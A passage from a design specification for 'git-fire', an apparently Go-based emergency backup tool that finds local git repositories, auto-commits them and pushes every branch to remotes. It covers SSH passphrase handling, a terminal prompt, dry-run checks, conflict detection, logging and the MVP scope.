export GIT_FIRE_SSH_PASSPHRASE_ED25519="passphrase-for-ed25519"
git-fire

# Option 3: Single passphrase (if all keys use same one)
export GIT_FIRE_SSH_PASSPHRASE="same-passphrase-for-all"
git-fire

# Option 4: Runtime arguments
git-fire --ssh-passphrase-rsa "pass1" --ssh-passphrase-ed25519 "pass2"

# Option 5: Config file (if you trust your disk encryption)
# ~/.config/git-fire/config.toml
[auth.ssh_passphrases]
id_rsa = "passphrase1"      # WARNING: Plaintext!
id_ed25519 = "passphrase2"  # Only use if disk is encrypted!

# Recommended alias for emergency use
alias emergency-fire='ssh-add ~/.ssh/id_rsa && git-fire'
```

**Passphrase Auto-Detection Mapping:**
- `GIT_FIRE_SSH_PASSPHRASE_RSA` → `~/.ssh/id_rsa`
- `GIT_FIRE_SSH_PASSPHRASE_ED25519` → `~/.ssh/id_ed25519`
- `GIT_FIRE_SSH_PASSPHRASE_ECDSA` → `~/.ssh/id_ecdsa`
- `GIT_FIRE_SSH_PASSPHRASE` → try for all keys

**Startup Validation Flow (before showing prompt):**
1. **Detect SSH keys:** Scan `~/.ssh/` for common key types
2. **Check ssh-agent:** See which keys are already unlocked (`ssh-add -l`)
3. **Try preconfigured passphrases:** If provided via env/config/args:
   - Attempt to unlock each key with its passphrase
   - Validate by testing `ssh-add <key>` with passphrase
   - Track status: unlocked ✓, failed ✗, needs passphrase ⚠
4. **Build SSH key status table** for display in prompt

**Enhanced Prompt Screen (shows SSH status):**
```
╔════════════════════════════════════════════════════════════════╗
║  🔥 GIT FIRE - PANIC MODE 🔥                                  ║
║                                                                ║
║  SSH Keys Detected:                                            ║
║  ✓ ~/.ssh/id_rsa (unlocked)                                   ║
║  ✗ ~/.ssh/id_ed25519 (passphrase FAILED - wrong password?)   ║
║  ⚠ ~/.ssh/id_ecdsa (locked - needs passphrase)               ║
║                                                                ║
║  ⚠️ WARNING: Some keys locked or failed validation!           ║
║                                                                ║
║  ► YES, PUSH ANYWAY (may skip some repos)                     ║
║    NO, CANCEL                                                  ║
║    FIX PASSPHRASES (enter/correct them now)                   ║
║    FIRE DRILL (DRY RUN)                                        ║
║                                                                ║
║  Timer: [████████████████░░░░░░░░░░░░░░░░░░] 10s              ║
╚════════════════════════════════════════════════════════════════╝
```

**Interactive Passphrase Fixing (if "FIX PASSPHRASES" selected):**
- Show each locked/failed key
- Prompt for passphrase
- Validate immediately (try ssh-add)
- Show success/failure in real-time
- Allow retry if validation fails
- Once all fixed, return to main prompt

**Fire Drill Validation (Recommended for Testing):**
Fire drill mode validates entire workflow without executing pushes:
- Tests SSH auth by running `git ls-remote` on each remote
- Validates passphrases work correctly
- Detects which repos would be skipped due to auth failures
- Shows detailed report of what would happen

**Automated Testing:**
```bash
# Add to crontab: test fire drill weekly to catch broken auth
0 0 * * 0 /usr/local/bin/git-fire --dry-run --quiet > /tmp/fire-drill.log 2>&1

# Check exit code to detect failures
0 0 * * 0 /usr/local/bin/git-fire --dry-run && echo "Fire drill: OK" || echo "Fire drill: FAILED - check passphrases!"

# Send email on failure (requires mail command)
0 0 * * 0 /usr/local/bin/git-fire --dry-run || echo "Git-fire auth broken!" | mail -s "ALERT: Fire Drill Failed" you@example.com
```

**Why this matters:**
Passphrases can break due to:
- SSH keys rotated
- ssh-agent configuration changed
- Env vars not set in cron environment
- Config file moved/deleted

Regular fire drills catch these issues before real emergencies.

**Error Handling:**
- If passphrase wrong: clear error, offer retry
- If user skips: attempt push anyway, skip on auth failure
- Log all auth failures for debugging

---

## Algorithm Details

### Scanning Algorithm (Parallel)

```
1. Create work queue of directories to scan
2. Spawn N goroutines from pool
3. Each goroutine:
   a. Pop directory from queue
   b. Walk directory
   c. Check depth < max_depth
   d. If .git/ found, record path
   e. Add subdirs to queue (respecting excludes)
   f. Collect remotes from .git/config
   g. Report progress
4. Aggregate results
5. Return []Repository
```

### Conflict Detection

```
For each local branch B in repo R:
  1. Check if B exists on origin
  2. If exists:
     a. Fetch latest from origin (or skip if recent)
     b. Get local commit SHA: L
     c. Get remote commit SHA: R
     d. If L != R:
        - Check if L is ancestor of R (fast-forward)
        - If not: CONFLICT
        - Mark HasDiverged = true
  3. If doesn't exist:
     - Mark IsRemote = false
     - Action depends on config mode
```

### Push Execution

```
For each repo in push plan:
  0. Auto-commit if dirty:
     - git add -A
     - git commit -m "git-fire emergency backup - {timestamp}"
     - Log commit SHA

  1. Validate auth for repo remotes (per-repo, not upfront)

  2. For each branch in plan:
     a. If action == SKIP: continue

     b. If action == PUSH:
        - For each remote in repo (origin, backup, etc.):
          * git push <remote> <branch>
          * If fails (conflict detected): create new branch instead

     c. If action == NEW_BRANCH:
        - git checkout -b <new-name>
        - For each remote in repo:
          * git push <remote> <new-name>

     d. Log result (success/failure, commit SHA, remote, branch name)
     e. Update progress UI

  3. Aggregate per-repo result
  4. Continue to next repo (don't fail hard on one repo error)
  5. Retry failed pushes (3 attempts with exponential backoff)
```

---

## Logging

### Log File Format
- Location: `~/.config/git-fire/logs/git-fire-YYYY-MM-DD-HHMMSS.log`
- Format: JSON lines (one log entry per line)
- Level: Configurable (debug, info, warn, error)

### Sample Log Entry
```json
{"timestamp":"2024-02-06T14:30:25.123Z","level":"info","component":"executor","message":"Starting push phase","repo":"/home/user/projects/myproject","branches_to_push":3}
{"timestamp":"2024-02-06T14:30:26.456Z","level":"info","component":"git","message":"Branch pushed","repo":"/home/user/projects/myproject","branch":"main","remote":"origin","duration_ms":523}
{"timestamp":"2024-02-06T14:30:27.789Z","level":"warn","component":"git","message":"Conflict detected","repo":"/home/user/projects/myproject","branch":"feature-x","local_sha":"a1b2c3d","remote_sha":"x9y8z7w","new_branch":"git-fire-backup-feature-x-1706-a1b2"}
{"timestamp":"2024-02-06T14:30:28.012Z","level":"info","component":"executor","message":"Panic mode complete","total_repos":12,"total_branches_pushed":34,"conflicts_resolved":2,"duration_seconds":154,"failures":0}
```

### Log Levels
- **DEBUG:** Detailed operation info, git commands, internal state
- **INFO:** Major operations (repos found, branches pushed, conflicts)
- **WARN:** Non-fatal issues (skipped repos, slow operations)
- **ERROR:** Failures (auth issues, push failed, etc.)

---

## Error Handling Strategy

### Critical Errors (Halt Execution)
- Auth validation fails → Stop before pushing, show error, exit code 1
- Config invalid → Show validation errors, exit code 2
- Filesystem scan timeout → Show error, exit code 3

### Non-Critical Errors (Log & Continue)
- Single repo push fails → Log error, continue to next repo, note in summary
- Single branch push fails → Log error, try next branch
- Network timeout on one push → Retry N times, then skip, log

### Error Recovery
- Retry policy: 3 retries with exponential backoff (1s, 2s, 4s)
- If fatal: Show user-friendly message + point to logs
- Always save logs, even on partial failure

---

## Git Operations Implementation Notes

### Shell Out to Git Binary (Not go-git)

**Decision:** Use system `git` binary via `os/exec` for all git operations.

**Rationale:**
- **Performance:** Native git is significantly faster than go-git for push operations
- **Reliability:** Leverages battle-tested git implementation
- **Auth:** Inherits system git credentials (SSH keys, credential helpers)
- **Compatibility:** Works exactly like manual git commands

**Requirement:** git must be installed on system (reasonable expectation for git backup tool).

Key functions to implement:
```go
// Scanner
func ScanRepositories(scanPath string, excludes []string, maxDepth int) ([]Repository, error)
func GetRemotes(repoPath string) ([]Remote, error)  // Parse .git/config or use `git remote -v`
func GetBranches(repoPath string) ([]Branch, error)  // Use `git branch -a` + `git rev-parse`

// Operations
func AutoCommitDirty(repoPath string) error  // git add -A && git commit -m "..."
func DetectConflict(repoPath, branchName, remoteName string) (bool, error)  // Compare SHAs
func PushBranch(repoPath, remoteName, branchName string) error  // git push <remote> <branch>
func CreateBranchAndPush(repoPath, newBranchName, remoteName string) error  // git checkout -b + git push

// Auth
func DetectSSHKeys() ([]SSHKey, error)  // Scan ~/.ssh/ for keys
func UnlockSSHKey(keyPath, passphrase string) error  // ssh-add <key>
func IsKeyUnlocked(keyPath string) (bool, error)  // ssh-add -l
func TestRemoteAuth(repoPath, remoteName string) (bool, error)  // git ls-remote <url>
```

**Example command execution:**
```go
func PushBranch(repoPath, remoteName, branchName string) error {
    cmd := exec.Command("git", "push", remoteName, branchName)
    cmd.Dir = repoPath
    output, err := cmd.CombinedOutput()
    if err != nil {
        return fmt.Errorf("push failed: %w\n%s", err, output)
    }
    return nil
}
```

---

## Testing Requirements (MVP)

### Unit Tests
- Config loading and validation
- Branch conflict detection logic
- Push plan generation

### Integration Tests
- Scanning with local test repos
- Pushing to local bare repositories
- Conflict creation and resolution

### Manual Testing Checklist
- [ ] Fire drill shows accurate dry-run
- [ ] Prompt timeout works
- [ ] Scanning on large directories completes
- [ ] Push with conflicts creates backup branches correctly
- [ ] Auth failures caught early
- [ ] Log files created with correct content
- [ ] Cross-platform binary works (Linux, macOS, Windows)

---

## MVP Deliverables

### Must-Have (Phase 1)
1. Config file parsing (TOML) with validation
2. Parallel disk scanning for `.git` directories
3. Remote and branch discovery
4. Interactive prompt screen with timeout
5. Fire drill dry-run mode with detailed report
6. Conflict detection
7. Panic mode push execution with real-time UI
8. New branch creation on conflicts
9. **Backup to new remote mode:**
   - Auto-create repos on target (GitHub/GitLab/Gitea API)
   - Repo renaming with templates
   - Add new remote to repos
   - Generate backup manifest
10. SSH passphrase handling
11. Structured logging to file
12. Completion report
13. Cross-platform binary (macOS, Linux)

### Nice-to-Have (Phase 2)
- Windows support
- GitHub auto-repo creation
- Dropbox / S3 backend support
- Web dashboard for history
- Scheduled automatic backups
- Slack/email notifications
- Configuration UI wizard

---

## Project Structure & Entry Point

### main.go
```go
package main

import "git-fire/cmd"

func main() {
    cmd.Execute()
}
```

### cmd/root.go
Cobra root command that:
- Loads config
- Parses flags
- Determines mode (interactive / --dry-run / --auth-check)
- Hands off to executor

---

## Dependencies Summary

```go
// External dependencies
charmbracelet/bubbletea - TUI framework (interactive prompts, progress)
charmbracelet/lipgloss  - Terminal styling (colors, layout)
spf13/cobra             - CLI framework (command parsing, flags)
spf13/viper             - Config loading (TOML parsing)

// Standard library (no external deps needed)
os/exec                 - Shell out to git binary
crypto/ssh              - SSH key detection
path/filepath           - Filesystem scanning
```

**System requirement:** `git` binary must be installed (version 2.0+).

**No go-git dependency:** We shell out to system git for reliability and performance.

---

## Success Criteria

1. **Functional:** User can run `git-fire`, see prompt, run fire drill, execute push
2. **Safe:** No data loss, conflicts handled gracefully, logs comprehensive
3. **Performant:** Scans 100+ repos in < 1 minute, pushes with reasonable speed
4. **Portable:** Single binary, no dependencies beyond Go runtime
5. **User-Friendly:** Clear UI, helpful error messages, intuitive controls
